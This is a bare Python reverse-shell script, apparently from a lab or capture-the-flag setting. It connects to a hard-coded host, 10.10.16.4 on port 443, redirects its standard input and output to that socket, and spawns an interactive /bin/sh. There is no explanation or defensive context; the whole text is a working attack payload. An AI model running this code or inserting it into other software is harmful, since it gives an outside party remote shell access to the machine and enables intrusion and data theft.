import socket, os, pty

s = socket.socket()

s.connect(("10.10.16.4", 443))

for fd in (0,1,2):
    os.dup2(s.fileno(), fd)

pty.spawn("/bin/sh")
